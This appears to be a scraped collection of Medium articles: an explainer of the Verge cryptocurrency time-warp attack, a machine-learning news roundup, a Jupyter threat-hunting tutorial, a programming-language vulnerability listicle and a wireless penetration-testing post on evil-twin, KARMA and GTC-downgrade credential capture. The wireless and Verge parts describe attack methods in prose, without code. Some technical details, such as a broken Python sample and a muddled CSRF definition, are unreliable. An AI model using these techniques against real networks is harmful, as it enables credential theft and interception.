Cryptocurrency enthusiasts are keen on telling ordinary civilians how safe and secure the Blockchain protocols powering their favorite coins are. Indeed, major cryptocurrencies like Bitcoin and Ethereum have maintained their security quite well — better, arguably, than any other digital asset/payment system in history — which is pretty remarkable, considering that they are unbacked digital money free from any single party’s control with an effective multi-billion dollar bounty on their proverbial heads.
Many, however, will go a step further, and declare said cryptocurrencies to be literally “unhackable.” This is, at the very least, a tactical error, since the proliferation of the “unhackable” meme forces the enthusiast into some awkward positions when and if certain events unfold. Like, say, a hack.
In such an event, it seems that, if nothing else, an explanation is in order.
Last month, an as-of-yet unidentified attacker was able to severely compromise Verge, a relatively small, privacy-focused cryptocurrency. The mystery hacker managed to dominate the network on three occasions for intervals of several hours at a time over the course of April 4th-6th, preventing any other user from making any payments. Worse, in that interval, they were able to generate what is effectively counterfeit Verge at a rate of 1,560 Verge coins (roughly $80) per second, minting what amounted to over a million dollars worth of the currency.
No need to beat around the bush — this was a disaster. The thing was hacked to high heaven.
But who’s to blame? Is this a case of human error on the part of the Verge developers, an undermining of crypto fundamentals, or something in between? Could such a thing happen again, perhaps to larger currencies, and if so, what can be done to prevent it?
With these sorts of breaches, many details inevitably remain murky. However, in this case, the fundamental exploits can be fairly clearly understood. Onward:
Timestamp Spoofing (Or: Honest Mistakes vs. Dangerous Lies)
The root of the exploit is something that would appear, prima facie, to be a bug, but is actually a deliberate feature: the ability to create “inaccurate” timestamps. In blockchain protocols, individual transactions (usually payments from one party to another) are grouped together into a single block, which is then confirmed as a whole. Every block comes with a timestamp of its creation date. Even when a blockchain protocol is functioning properly, the ordering of these timestamps may sometimes be out of sequence; i.e., block 100 may have a timestamp that actually comes after block 101. This is because, in decentralized networks that obstinately refuse to grant any special authority to third parties, accurately enforcing time synchronization is no simple matter. Given the unpredictable variance in the time it takes for data to propagate through the peer-to-peer network, it’s entirely possible for block times to appear “out of order,” even when all parties are being perfectly honest. In other words, it’s only fair to allow some degree of flexibility; in the case of Verge (before the hack, anyway), the protocol allowed nodes to “disagree” about the current time by a window of, at most, two hours.
The entry point for the hacker was to start spoofing timestamps, submitting blocks that appear to be from the past, but are still within the allotted two-hour window, and thus eligible for acceptance by the other nodes.
Why this would ultimately matter for network security has to do with the nature of proof-of-work mining.
Mining Difficulty (Or: Gates Only Work When They’re Raised)
Keeping the Verge network decentralized requires ensuring that fairly small-scale devices (macbooks, say) can participate in running the network’s software. This, in turn, means limiting the volume of payment activity on the network; i.e., setting a clear target block time (and in turn, a limit on the network’s transactions per second). For Verge, the target is one block per 30 seconds. Now, one might well ask, given that the network is decentralized, how could this be enforced? What’s stopping parties from submitting blocks at a much faster rate? This is no trivial problem; given that an accepted block earns its submitter a block reward, it’s in the submitter’s incentive to confirm blocks as fast as possible.
The answer, in short, is proof of work mining. For a block to be considered valid by the network, it must contain a solution to a cryptographically difficult computational problem derived directly from the data in the block itself. The nature of this problem is such that the difficulty can be freely adjusted. The target block time for Verge is one block every 30 seconds, and the difficulty of mining blocks is constantly being adjusted based on the current rate of block confirmations; if more people decide to devote more mining power to generating Verge blocks, and more blocks get mined faster, the protocol increases mining difficulty and block submission is throttled. Conversely, as mining power lowers and block time increases, mining is made easier. Thus, when properly functioning, even as messy real-word factors change — economic fluctuations, market prices of crypto, energy markets, empires rising and falling, etc — the Verge network is perpetually reacting and guiding the network to our target block-rate equilibrium.
The algorithm that Verge uses to calculate the current difficulty is known as Dark Gravity Wave; it involves taking a weighted average of the rate of block confirmations over a moving 30-minute window. It’s a bit complex, and the details don’t really matter here — what matters is this: mining difficulty is a function of recent block frequency, and running calculations on block frequency naturally involves looking at blocks’ timestamps.
And hence the problem: if enough faulty timestamps are getting created, all bets are off. And this is what the hacker did — examining the blockchain data reveals that throughout the duration of the hack(s), every other block was submitted with a timestamp roughly one hour before the present time, tragically confusing the protocol’s mining adjustment algorithm. If the protocol were sentient and fluent in English, it would be saying something like “Oh no! Not enough blocks have been submitted recently! Mining must be too difficult — let’s make it easier!” Since timestamps were continuously being spoofed, the protocol continuously lowered the difficulty, until mining got laughably easy. To give a general idea, the average difficulty in the hours before the initial attack was 1393093.39131, while during the attack, it got as low as 0.00024414, a decrease in difficulty of over 99.999999%. Lower difficulty in submitting a block means more blocks get submitted— in this case, roughly a block every second.
The cleverness of this attack is in how it circumvents the barrier of mining difficulty instead of attempting to burst through it. If the security provided by mining power is a gate surrounding the network — a gate that’s far too strong to break through and too high to climb over — this hack gets past it by finding a way to lower it so close to the ground that it can be stepped over.
If it isn’t already obvious, this is, in and of itself, bad news. A violation of the intended protocol this blatant is simply not a good look. Additionally, the drastically increased block submission rate means lots of more newly mined Verge than the protocol had allotted, which is bound to bother you if you’re the sort of economist who has a thing for sound money with predictably high stock-to-flow ratio.
However, lowering the difficulty is only half the story; in isolation, it wouldn’t actually give the attacker any advantage. With the difficulty drastically lowered, mining blocks does become easier for the attacker, but it also becomes easier for everyone else; miners are still competing against each other just like before. What we would expect to see is that although, yes, blocks get mined faster, the identities of the successfully miners should be just as distributed and democratic as before. Or, put another way, no matter the difficulty, a single attacker would still need 51% of the mining power to dominate the network, which is just as hard as it was to do before the attack.
However, this hacker did indeed take over the entire network, and was able to do so with far less than 51% of the hash-rate. What enabled them to do this is the second component of this exploit, which has to do with Verge’s use of multiple mining algorithms.
Verge Mining (Or: When Five Algorithms Aren’t Better Than One)
Generally, blocks in proof-of-work based cryptocurrencies are mined by a single algorithm, the most common being SHA-256. Verge, however, allows miners to use any of five different algorithms (for those dying to know, the algorithms Verge uses are Scrypt, X17, Lyra2rev2, myr-groestl and blake2s.) The rationale for using multiple mining algos is something like this:
Some critics of Bitcoin argue that over time, the Bitcoin mining industry has gotten too specialized and centralized; most mining of the currency, for example, is performed by Bitcoin ASICs, devices created for the sole purpose of mining the currency, and much of Bitcoin mining is performed by a few mining pools — groups of miners that amalgamate their resources together and share the rewards proportionally. These trends towards different types of “centralization”, they say, are antithetical to the fundamental value proposition of permissionless cryptocurrencies. Having a coin use multiple mining algorithms purports to be a bulwark against these trends. The argument goes that controlling five different algorithms in terms of hardware, industry, and resource management, is bound to be harder than controlling just one, pushing the Verge mining economy in the more distributed, decentralized direction.
So here’s the deal: the only way for this to properly function — and “properly functioning” in this case includes maintaining 30 second block times, keeping all five algos economically sound for miners, and preventing one of the five algos from dominating (which would render the whole experiment pointless) — is to have each algorithm have its own difficulty parameter that gets adjusted independent of the other four. Which is to say, Scrypt’s mining difficulty is adjusted to hit 30 second block equilibrium, as is X17’s, and so on.
What this means is that our timestamp forger didn’t actually lower the difficulty of mining for the whole network; he only lowered it for those mining with one of the five algorithms — Scrypt, it turns out. So while the Scrypt miners now all enjoy comically easy mining difficulty, the miners utilizing the other four algos are stuck having to work just as hard as before, rendering all of their hash-power effectively useless for securing the network. Crucially, this meant that the attacker only had to mine with the Scrypt algorithm and only had to compete against the others doing the same; thus, required hash-power for our attacker to dominate goes from over 50% (dominating the whole network) to over just 10% (dominating the other Scrypt miners).
Now at this point, things do get a bit speculative, but it would appear that the situation was a lot worse than even that. The “10%” estimate stems from the fact that given the nature of mining difficultly adjustment, roughly the same amount of economic resources should be applied to each of the five mining algos. Reality, however, often has a way of stubbornly refusing to conform to the axioms of free market economics. According to discussions within the community, various factors — the existence of Scrypt ASICs that had yet to be deployed, the spare resources available for rent via Nicehash, etc — meant that Scrypt would, at the time of the attack, have been far cheaper to dominate than any of the other four algos. One can safely assume the required hash-rate ultimately comes to far less than 10%; some back-of-the-napkin estimates on reddit place it was as low as 0.4%.
So, in sum: timestamp spoofing made it possible to drastically lower mining difficulty; Verge’s use of five algorithms meant that one could lower the difficulty of just one of them, thus making it far easier to override the whole network; the economic/industrial status of this one particular mining algorithm made it even easier to dominate still; and finally, the drastically decreased block-times ensuing from the low difficulty made the attack roughly 30 times more profitable than it would otherwise be.
Lessons Learned
What can be gleaned from all of this? The short-term aftermath of the hack was predictably messy and confusing. After a rough few days, the core developers deployed some quick bug-fixes, which may or may not have had mistakes embedded in them, and the network eventually underwent a hard fork, which may or not have initially been an accident. As for the response in the world at large, in the week following the hack, the price of Verge increased by 30%, and in the following week, it was announced that Verge would be accepted as subscription payment for pornhub.com. Exactly how the largest protocol-level hack of a cryptocurrency in recent memory could preceed said cryptocurrency increasing in price and then announcing a partnership with the most trafficked porn-site on the internet is a question I’m forced to leave open-ended; my personal pet-theory is that it has something to do with the fact that the world makes no sense and human beings are all completely out of their goddamn minds.
But I digress. In the grander scheme of things, there may indeed be some useful take-aways here:
First off, the trick of using timestamps to artificially lower difficulty is one that has actually been known about long enough to get its own name — the “time-warp” exploit. One can find discussions of the attack vector on Bitcoin forums from years ago. In some sense, what made the attack work in Verge is their use of the newer, fancier, Dark Gravity Well difficulty adjusting algorithm, in which difficulty is tweaked with every new block, as opposed to, say Bitcoin, where difficultly is tweaked only every 2016 blocks. While adjusting difficulty in such spaced out, discrete increments may at first glance seem like an odd design decision, this hack makes it clear that it’s actually a security precaution; should there be some way to slightly lower mining difficultly, in Bitcoin, the assailant can only do so once every 2 weeks, rendering the results negligible, compared to Verge, where they can do so once every 30 seconds.
Interestingly, one of the purported benefits of Dark Gravity Wave is specifically that it’s supposed to be immune to the time-warp exploit. Given how decisively such a claim has now been disproven, other currencies using it ought to be, at minimum, a bit nervous.
As for the use of five mining algos: while, from a distance, this appears to be a worthy experiment in economically encouraging decentralization, it again introduces new complexities which inevitably increase the likelihood of unforeseen vulnerabilities emerging.
In both cases, this hack presents a strong argument for tending towards sticking to things proven to work and to be wary of overcomplicating things and thereby introducing unnecessary risks when people’s financial assets are involved. Which, I suppose, means two points for team Bitcoin.
There’s a larger point to be made here: software developers, as much as we’re loathe to admit it, are, in the final analysis, only human. Even when underlying security principles seem perfectly sound, there’s always room for error. Unexpected attack vectors emerge; trade-offs get poorly estimated; and then, of course, there’ll always be good old fashioned bugs. That software doesn’t always work the way we want it to, and that such malfunctions can lead to the loss of funds, shouldn’t be particularly shocking to anyone in 2018. But when that software is, in fact, money, it’s worth an extra layer of precaution.
Given that most of us don’t have the spare time to conduct a thorough code review of every project we invest in, the best guards against disaster are to put more trust in things which a proven track record of working properly, and whose development ethos veers on the conservative side. And should you want to stake some funds in more experimental, move-fast-and-breaks-things-and-raise money style projects, at least be aware of the risks involved. Most importantly, pressure from the community for due diligence in trying to mitigate future disasters is ultimately the best defense. I believe it was George Santayana who said “Those who fail to learn from the security holes of the past are doomed to reimplement them, ” words to heed by lest we unexpectedly find ourselves on the verge of doin’ the time warp again.
Correction: The window of difficulty retargeting was originally reported as being equal to the allowed time drift (2 hours). In fact, the retargeting window is actually 30 minutes, which, for those keeping track at home, is in fact LOWER than the allowed time drift.
Update (5/22): Seems we are, indeed, doin’ the time warp again; the same vulnerability is being exploited again as we speak, though word is that this time the hacker(s) used two mining algos instead of one. Stay tuned!
Update: Read the follow-up post on the second hack here
For inquiries: daniel@theabacus.io
Written by
","['Bitcoin', 'Cryptocurrency', 'Blockchain', 'Finance', 'Cybersecurity']"
"This Week in Machine Learning, 23 September 2016 - Udacity Inc - Medium",https://medium.com/udacity/this-week-in-machine-learning-d7e3ecd648f8?source=tag_archive---------7-----------------------,"This week’s top Machine Learning stories, including catching cybercriminals, screening for speech disorders, and … sorting cucumbers?
Machine Learning is one of the most exciting fields in the world. Every week we discover something new, something amazing, something revolutionary. It’s incredible, but it can also be overwhelming. That’s why we created This Week in Machine Learning! Each week we publish a curated list of Machine Learning stories as a resource to help you keep pace with all these exciting developments. New posts will be published here first, and previous posts are archived on the Udacity blog.
Whether you’re currently enrolled in our Machine Learning Nanodegree program, already working in the field, or just pursuing a burgeoning interest in the subject, there will always be something here to inspire you!
British cybersecurity firm Darktrace leverages machine learning to address the growing problem of cybercriminals stealing money by infecting ATMs with malware.
Apple acquires another machine learning firm, purchasing India-based Tuplejump and its open-source FiloDB project for analyzing massive amounts of complex data.
Evernote shifts its data from private servers to Google’s cloud infrastructure in large part to take advantage of Google’s artificial intelligence infrastructure.
Researchers at MIT create a machine learning-based system for automatically screening children for speech and language disorders through an accessible mobile app.
Facebook launches a new feature, powered by machine learning, that automatically infers when a message suggests a transaction and prompts the recipient to pay.
Makoto Koike, a Japanese farmer, uses TensorFlow with a Raspberry Pi 3 to create a system that automatically sorts cucumbers based on photos from low-resolution webcams.
Written by
","['AI', 'Autonomous Systems', 'Business', 'Data Science', 'Programming', 'Artificial Intelligence', 'Machine Learning', 'Cybersecurity', 'Big Data', 'Healthcare']"
Threat Hunting with Jupyter Notebooks— Part 1: Your First Notebook �,https://posts.specterops.io/threat-hunting-with-jupyter-notebooks-part-1-your-first-notebook-9a99a781fde7?source=tag_archive---------6-----------------------,"When it comes to threat detection, how many times have you heard someone say “It is all in my head, just ask me if you have any questions!” or “Only he/she/they know(s) how to do it!” Plenty of times, right? Not documenting, standardizing or sharing how to analyze data to detect potential intrusions in a network is more common than you think, especially when the team is very diverse from a technical and expertise perspective. It does not only affect your detection strategies but also the dynamics of your team.
Now, how many times have you also thought about a more efficient, intuitive or creative way to analyze the security events your organization collects, but you feel limited to the capabilities of a one language-dependent search bar?
This post is part of a five-part series which will introduce the concept of utilizing Jupyter Notebooks for a more dynamic, flexible and language-agnostic way to analyze security events, and at the same time help your team document, standardize and share detection playbooks. Something you can integrate with projects like the ThreatHunter-Playbook, and deploy it at home for free and for unlimited time with open source projects like HELK.
In this first post, I will go over the basics of how Jupyter Notebooks work, how to create your first notebook and how to run some initial basic commands in Python.
The other four parts can be found in the following links:
Think of a notebook as a document that you can access via a web interface that allows you to save input (i.e. live code) and output (i.e. code execution results / evaluated code output) of interactive sessions as well as important notes needed to explain the methodology and steps taken to perform specific tasks (i.e data analysis).
The Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and narrative text. Uses include: data cleaning and transformation, numerical simulation, statistical modeling, data visualization, machine learning, and much more
The Jupyter Notebook project is the evolution of the IPython Notebook library which was developed primarily to enhance the default python interactive console by enabling scientific operations and advanced data analytics capabilities via sharable web documents.
Nowadays, the Jupyter Notebook project not only supports Python but also over 40 programming languages such as R, Julia, Scala and PySpark. In fact, its name was originally derived from three programming languages: Julia, Python and R which made it one of the first language-agnostic notebook applications, and now considered one of the most preferred environments for data scientists and engineers in the community to explore and analyze data.
Jupyter Notebooks work with what is called a two-process model based on a kernel-client infrastructure. This model applies a similar concept to the Read-Evaluate-Print Loop (REPL) programming environment that takes a single user’s inputs, evaluates them, and returns the result to the user.
Based on the two-process model concept, we can explain the main components of Jupyter in the following way:
I am sure you are anxious to install Jupyter and start exploring its capabilities, but first you have to decide if you want to install the Jupyter Notebook server directly on your system or host it on a virtual machine or a docker container.
I believe it is important to give you the options so that you feel comfortable running the tool however you feel like it. If you want to do a classic install directly on your system, follow the official Jupyter Install documents.
For this series, we are going to use the HELK project . I prefer to share a standardized and working environment via docker images to focus more on the capabilities of the application rather than spend time troubleshooting the server installation.
Let’s create our first notebook and get familiarized with additional options.
There are several options available in the notebook interface, and most of them are very straight-forward and work in a similar way to what you get in a regular document tool-bar where you can save, open or close files. However, there are a few options and concepts that are very important to understand:
You can also access more options via the Run tab as shown below:
Now that we understand how to interact with the Jupyter Notebooks interface, let’s run some basic python code in the input cell container.
print(""Hola World!!"")
dog_name = 'Pedro'
print(dog_name + "" is my best friend!"")
One helpful feature over the standard python shell is tab completion.
dog_<tab>
dog_list = ['pedro, 4, 2015]
Another cool feature is Introspection, and it is used to get information about an object (i.e list, functions, etc). You can simply type a question mark (?) before or after an object.
That was very easy, right? If this was your first time using Jupyter Notebooks, I hope this helped you to get familiarized with the basic concepts and expedite the deployment of your first Jupyter environment !
If you want to get the Jupyter token again, you can do it with the following:
In the next post, we will use a few of the available notebooks in the HELK jupyter container to learn a little bit more about data analysis of security event logs with a python library named Pandas.
https://jupyter.org/
https://jupyter4edu.github.io/jupyter-edu-book/
https://jupyter.readthedocs.io/en/latest/architecture/how_jupyter_ipython_work.html
https://ipython-books.github.io/chapter-3-mastering-the-jupyter-notebook/
https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop
https://jupyterlab.readthedocs.io/en/stable/getting_started/overview.html#overview
Written by
","['About', 'All Posts', 'specterops.io', 'Qt Console', 'Tornado', 'ZeroMQ', 'HELK project', 'Mordor', 'IPython kernel', 'PRINT', 'FOR loop', 'RANGE', 'random', 'Data Science', 'Threathunting', 'Cybersecurity', 'Dfir', 'Sql']"
Top 5 Vulnerable Programming Languages. - HackerNoon.com - Medium,https://medium.com/hackernoon/top-5-vulnerable-programming-languages-eab3144d6db7?source=tag_archive---------1-----------------------,"Many of the programmers argue that a programming language is secure and powerful than other programming languages but the fact is that every programming language has its own pros and cons. and the task done by one particular programming is may or may not effectively done by another programming language.
Eg:- Developing an Android application will more efficient with java than the python.
But Some developers and researchers claim that there are some languages that are more or less secure than other languages, but to claim the truth we need to consider many factors that go into choosing a programming language, and it’s up to us to make sure, when we use it, that we are doing everything we can to ensure our software project’s security.
Recently a new report is released by security research company i.e WhiteSource about the security of programming language, what vulnerabilities and issues they encountered is that XSS(Cross-Site Scripting), input validations, permissions, privileges, Information leak, and Access Control, According to the report the most widely used and vulnerable programming languages are
Now, we will focus on various vulnerabilities of each programming language in detail
C is one of the old programming languages available in the industry. It is a procedural oriented programming language. this programming language laid a foundation for later developed programming languages like Java, PHP, JavaScript.
The main features of C language include:
These features make C language suitable for system programmings like an operating system or compiler development.
The most common vulnerabilities in C Programming are:
Buffer Overflow Error: Most popular buffer overflows are:
Format String Vulnerability: It occurs if an attacker is able to specify the format string to a format function. If the format string that is received differs from that which is expected, such as being longer or shorter than the allocated data space, the program may crash, quit or make up for the missing information by reading extra data from the stack; allowing the execution of malicious code.
Some examples of format function, which if not treated, can expose the application to the format string attack are fprint, printf, sprintf, snprintf, vfprintf, vprintf.
Integer errors: These are not exploitable vulnerabilities by themselves, but exploitation of these errors could lead to a situation where the program becomes vulnerable to one of the previously described vulnerabilities.
PHP is a server-side scripting language and a powerful tool for making dynamic and interactive Web pages. It is a widely-used, free, and efficient alternative to competitors such as Microsoft’s ASP.
The most common vulnerabilities in PHP Programming are:
Directory Traversal Attack: Directory traversal attacks are executed through web browsers. An attacker may manipulate a URL in such a way that the website will reveal the confined files on the web server.
Typically, web servers provide two security mechanisms to restrict user access:
Java is a popular general-purpose Object-Oriented programming language and computing platform. It is fast, reliable, and secure. According to Oracle, the company that owns Java, Java runs on 3 billion devices worldwide. The features of Java are
The most common vulnerabilities in JAVA Programming are:
JavaScript is one of the world’s most popular programming languages. The reason for this is quite simply because of its role as the scripting language of the world wide web. To be more precise, it’s a programming language that lets you implement complex and beautiful things/design on web pages. When you notice a web page doing more than just sit there and gawk at you, you can bet that the web page is using JavaScript. The features of Javascript are —
The most common vulnerabilities in JavaScript are:
XSS Attack: Cross-Site Scripting, or XSS, is one of the most common browser-side vulnerabilities. These types of attacks happen an attacker injects malicious code into a legitimate (but vulnerable) application. Attackers can manipulate JavaScript and HTML to trigger the malicious code or scripts.
CSRF Attack: Cross-Site Request Forgery involves taking over or impersonating a user’s browser session by hijacking the session cookie. CSRF attacks can trick users into executing malicious actions the attacker wants, or into taking unauthorized actions on the website.
Server-Side Javascript Injection: It is a newer type of JavaScript exploit, primarily targeted at backend framework Node.js application and NoSQL. While XSS attacks are executed in the end user’s web browser, Server-Side attacks are executed on the server level, which can have more disastrous effects on a website. In this type of attack, an attacker can upload and execute malicious binary files on the web server.
Client-Side logic issues: Improper validations and logical errors while integrating the code and if your website code hardcodes API keys into client-side JavaScript, this would be vulnerable to attackers.
C++
C++ is a general-purpose programming language and widely used for competitive programming. It has imperative, object-oriented and generic programming features. It is also used to develop Operating Systems, Games, Embedded Systems and developing new programming languages and frameworks as well. The popularity is this programming language is due it’s ridiculous speed.
The most common vulnerabilities in C++ are:
Python:
Python is a powerful multi-purpose programming language created by Guido van Rossum. It supports both the Object-Oriented paradigm and Functional Oriented paradigm. It has a simple syntax, making it the perfect language for someone trying to learn computer programming for the first time. the features of this language are —
This language is mostly used by the pen testers, Data Scientists, and researchers.
The most common vulnerabilities in Python are:
CROSS SITE REQUEST FORGERY: This security vulnerability occurs when a compromised web application is forced to perform an action by another logged-in user. Also, it includes hacking or logging into a website with others’ login credentials.
LDAP INJECTIONS: LDAP Stands for Lightweight Directory Access Protocol. This vulnerability occurs when a malicious user inserts/modify LDAP statements that lead to speculations.
XPATHI: This Security vulnerability occurs when a malevolent user intentionally passes data to a website. They can use that interaction to find out how the data is structured in XML, or they can access secured data that they can’t access normally.
CROSS SITE SCRIPTING (XSS): This security vulnerability occurs when a malevolent user can trick any web application to steal stored cookies, saved passwords, and script code that served unsuspecting users of that application.
Since technology is improving day to day. It will provide better solutions to resolve these issues. It is impossible to build a 100% efficient software every program has some issues and bugs. Finding the vulnerability and solving them is the better solution to improve the efficiency of the software.
I explained some attacks mainly which are done by hackers frequently. if you want complete information about all attacks please leave a comment.
If you liked this article, please click on the clap, leave me your valuable feedback, and share with your friends.
Hello busy people, I hope you had fun reading this post, and I hope you learned a lot here! This was my attempt to share what I’m learning.
I hope you saw something useful for you here. Have fun! Keep learning new things and see you next time! ��
Check out My Twitter, Github, and Facebook. �
Written by
","['About', 'Help', 'Go Home', 'Programming', 'Cybersecurity', 'Security Vulnerability', 'Programming Languages', 'Efficient Software']"
Top Five Ways I gained access to Your Corporate Wireless Network (Lo0tBo0ty KARMA edition),https://medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2?source=tag_archive---------7-----------------------,"While performing penetration and red team services , I have always enjoyed the challenge of gaining access to a well fortified wireless network. Red teams avoid or purposely target other network attack surface areas for good reason. If configured properly most hardened, or EAP-TLS networks are arguably more secure than most local area networks.
Common configuration mistakes, vulnerabilities, and chaining common network attacks while performing a wireless assessment can lead to corporate network access before lunch. Like my last Top 5 series, many of the same attack vectors used years ago still work in 2018.
Lo0tBo0ty KARMA
Using Lootbooty with KARMA has also allowed me to gather credentials for other domains that can be used to gain corporate network access. By using hostapd-wpe, Lo0tBo0ty and KARMA against both open and enterprise WPA2 networks, I’ve been able to snag credentials for EAP and TTLS networks ,where other Evil Twins fail. A set of valid user credentials can allow privilege escalation and persistence that can take a red team sometimes week to establish.
Shake that Booty with a GTC downgrade attack (a.k.a. Lo0tBo0ty)
At DEF CON 21, Josh Hoover(@wishbone1138) and James Snodgrass (@PunK1nPO0P) dropped their research on utilizing Generic Token Cards to get clear-text credentials from mobile devices connected to enterprise wireless. Josh does a fantastic job of covering the technical details, so I won’t cover them again here, but the tl;dr is that by having your authentication server request a one time password (i.e. GTC) and by sending a successful connection back to the client, you can get enterprise creds in clear text from mobile devices. I tested this on Android 5.01, and it still works! In the DEF CON talk, Josh and James released their tool “lootbooty“, which features a patch for freeradius-2.2. In addition, their tool featured a script to install and tear down the environment. This sounds like the perfect use case for a Docker container!
Note: Their talk/tool also featured an attack against ios devices, but this seems to be patched now.
Lo0tBo0ty
Hostapd-wpe
hostapd-wpe is the replacement for FreeRADIUS-WPE (http://www.willhackforsushi.com/?page_id=37).
It implements IEEE 802.1x Authenticator and Authentication Server impersonation attacks to obtain client credentials, establish connectivity to the client, and launch other attacks where applicable.
hostapd-wpe supports the following EAP types for impersonation: 1. EAP-FAST/MSCHAPv2 (Phase 0) 2. PEAP/MSCHAPv2 3. EAP-TTLS/MSCHAPv2 4. EAP-TTLS/MSCHAP 5. EAP-TTLS/CHAP 6. EAP-TTLS/PAP
A trick of mine, when creating a Radius certificate for my Evil Twin, is to try and make the fake certificate look as much as possible as the real certificate. If there are misconfigurations made within the environment, or client policy doesn’t enforce checking the legitimacy of the Radius server certificate, users will connect to your hostapd-wpe regardless; but having an almost identical certificate may lure a few more unsuspecting victims to your Evil Twin.
I prefer hostapd-wpe for it’s flexibility as opposed to using the standalone hostapd. Hostapd-wpe is the replacement for FreeRADIUS-WPE, and can impersonate more EAP protocols with a smaller footprint than FreeRADIUS-WPE. Hostapd-wpe also co-exists with RADIUS patched with PuNk1n.patch (aka Lo0tBo0ty) allowing for some KARMA Lo0tBo0ty’ng fun!
Armed with working credentials, I had access to the corporate wireless network and the companies’ VPN as well.
The idea remains the same; stand up an Evil Twin and intercept credentials. The routers, and devices mentioned below allow persistent or covert testing which can make the difference when you are restrained by time or location.
There are so many wrappers for creating Evil Twins that use hostapd-wpe; that there are literally wrappers for other people’s scripts. Rogue adds some extra features and functionality to s0lst1c3's eaphammer.
Docker environments:
Powerfull frameworks:
Specialized Routers
Raspberry Pi’s
Nethunter
2. Open and Captive Network Evil Twin
Just like antennas both transmit and received data there’s a client and a server. Sometimes we have stop attacking EAP-TLS or a strong WPA2-PSK implementation and shift gears, targeting insecure or outdated client wirelesses supplicants. Client devices still send out beacons for networks. When one goes about penetrating a large and sophisticated corporation, you might find they corporation has taken the right measures to ensure that EAP-TLS is in place, and the guest network is WPA2-PSK. The WPA2 keys are rotated and not advertised ; you also can’t crack the WPA2 handshake and recover the passphrase. What does one do? Do we give up and go home, no… we persevere!
KARMA Open Network Evil Twin Attacks
KARMA is a set of tools for assessing the security of wireless clients at multiple layers. Wireless sniffing tools discover clients and their preferred/trusted networks by passively listening for 802.11 Probe Request frames. From there, individual clients can be targetted by creating a Rogue AP for one of their probed networks (which they may join automatically) or using a custom driver that responds to probes and association requests for any SSID. Higher-level fake services can then capture credentials or exploit client-side vulnerabilities on the host.
Yup!, KARAMA, still works in 2018 and I’ve successfully used hostapd-wpe with KARMA and a Dynamic Host Configuration Protocol server (“DHCP”) server to prepare an “Evil Twin” wireless network that appeared to victims as a legitimate open network the clients have associated with.
The “attwifi” network will answer to all devices who request any Open Network by leveraging KARMA. Most users don’t delete their history of open network’s they connected to, making them the perfect target for this type of conditional KARMA attack.
If properly executed , we should subsequently received multiple client connections. Once a device connects, it is issued an IP address and is subjected to Man-in-the Middle (“MitM”) attacks on the assessor’s controlled network.
3. Guest Networks
Often corporations implement secure guest networks that require temporary credentials or a WPA2-PSK passphrase to gain access. These guest networks are intended for guest usage, but are often used by employees. Dependent on the environment, the WPA2 key may be supplied or even advertised in the lobby area of many corporations. Not rotating this key allows for a WPA2-PSK network twin to easily be turned into an Evil Twin
These are the two most common mistakes implemented on guest networks I’ve encourted:
a.) Guest Wireless Network Configuration Issues
Once connected to the wireless network, it’s sometimes possible to discover live hosts within the guest internal network environment.
b.) WPA-2 PSK Guest Evil Twin
What if the guest network has client isolation enabled? Sometimes the guest network use WPA2 with a pre-shared key. Client isolation is enabled and man-in-the-middle attacks don’t work! I personally double check with wireshark and bettercap to ensure client isolation is indeed doing it’s job.
Wireless Client Isolation is a security feature that prevents wireless clients from communicating with one another. This feature is useful for guest and BYOD SSIDs adding a level of security to limit attacks and threats between devices connected to the wireless networks.
Rogue, really stands out here — it’s one of the only scripts that let’s you stand up an WPA2-PSK Evil Twin Network in an automated fashion. Once devices are connected, client isolation is obviously not enforced on your Evil Network. MITM all things, but be careful and responsible when dealing with out of scope or personal wireless endpoints.
The main lesson learned here is to rotate your wireless key. If I’m theoretically on-boarded and come back a year later and don’t have to re-authenticate, to your wireless “Guest” network you’re doing something wrong. Many employees have these guest networks saved in their wireless supplicants history, and the default behavior on most operating systems and devices is to automatically connect when they’re available.
4. WEP & WPA2-PSK Cracking
Wifite 2 is the updated successor to the infamous Wifite Python script for auditing wireless networks which aims to be the “set it and forget it” wireless auditing tool.
I use Wifite for cracking WEP networks (Yes they’re still around) It automates the attack, and sometimes you just want to sit back and crack some old WEP.
Aircrack-ng is an open source suite of tools to perform WEP and WPA/WPA2-Personal key cracking, which runs on Windows, Mac OS X, Linux, and OpenBSD. It’s also downloadable as a VMware image and Live CD. You can capture data packets, inject and replay traffic, and reveal the encryption keys once enough packets have been captured.
Check out my previous blog post for more information about getting Aircrack-ng and Kismet running with the newer Alfa USB 3.0 cards; which takes a deeper dive into the newer Alfa cards that support injection in the 5 GHz spectrum.
As oppose to using wifite, or if you simply prefer doing things manually; lets capture a handshake with the aircrack-ng suite as mentioned in my blog post “5 GHz 802.11ac Wireless Attacks”
By following the steps below, you can manually capture thehandshake; save the network capture, and try to recover the passphrase by brute-forcing likely or possible pass-phrases using a wordlist and a GPU cracker like hashcat.
5. Rogue Access Points
While performing and discovering devices during the assessment, to obtain wireless network packet captures and identify wireless networks in scope; you may find devices that have unintended access to the companies infrastructure.
By walking through the facilities while scanning for radio frequency (RF) signals from wireless access points (WAPs), commonly described as “war-walking”, you can identify potential rogue access points.
The NETGEAR router above is an example of one rogue access point that was identified during testing, but not explicitly included in the list of authorized access points/addresse. The wireless network access point’s Administrator account and web interface was using a default password. By using a dictionary based password, I was able to sign into the router’s Administrative interface and control the network device’s configuration settings.
Attackers use out of band networks to bypass intrusion detection and prevention systems that usually only monitor network traffic on managed network devices within the environment. Furthermore, considering the wireless network does not encrypt data while in transit, an attacker can easily capture traffic and gain access to potentially sensitive information.
Written by
","['Cybersecurity', 'Penetration Testing', 'Technology']"
Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition),https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa?source=tag_archive---------3-----------------------,"A Scary Thought: I’ve worked in the Cyber ​​Security space performing a wide breadth of penetration and red team services for years. Yes it's still easy to get Domain Admin ""before lunch"" as it was when I first started pen-testing.
Back in September of 2013, Spider Labs wrote an article titled "" Top Five Ways SpiderLabs Got Domain Admin on Your Internal Network "" This article is written to compliment and serves as an unofficial “Part 2” to the original SpiderLabs Blog post.
